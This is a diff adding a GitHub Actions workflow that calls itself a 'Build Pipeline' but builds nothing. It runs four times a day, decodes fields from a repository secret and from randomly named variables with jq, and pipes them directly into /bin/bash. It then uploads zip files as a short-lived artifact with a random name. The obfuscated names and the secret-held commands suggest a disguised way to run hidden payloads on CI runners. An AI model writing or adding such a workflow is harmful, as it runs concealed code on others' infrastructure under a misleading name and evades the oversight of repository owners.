@@ -1,0 +1,34 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          luh2: ${{ secrets.luh2 }}
+        run: |
+          printf '%s' "$luh2" | jq -r .w791 | /bin/bash
+          printf '%s' "$mrx2" | jq -r .aagyz59151 | /bin/bash
+          printf '%s' "$crcz1771" | jq -r .i66 | /bin/bash
+          echo $yjv85988 | jq -r .tbfb65938 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WYIZ12wC
+          path: "*.zip"
+          retention-days: 1
